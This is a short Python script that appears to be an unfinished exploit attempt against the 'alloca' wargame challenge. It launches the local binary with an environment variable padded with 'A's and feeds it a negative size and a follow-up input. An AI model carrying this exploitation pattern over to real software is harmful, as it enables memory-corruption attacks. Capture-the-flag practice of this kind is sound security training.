import subprocess
import sys
import time


def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = p.stdout.read(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]


p = subprocess.Popen(["/home/raw/Documents/pwnable/rookis/alloca/alloca"], env={"BBBB":"AAAAAAAAAAAAAAAAAAAAAA"}, stdin=subprocess.PIPE, stdout=subprocess.PIPE)


#time.sleep(3)
#read_until('buffer')
p.stdin.write('-4093\n')
#read_until('BOF :')
p.stdin.write('2\n')
#read_until('????\n')

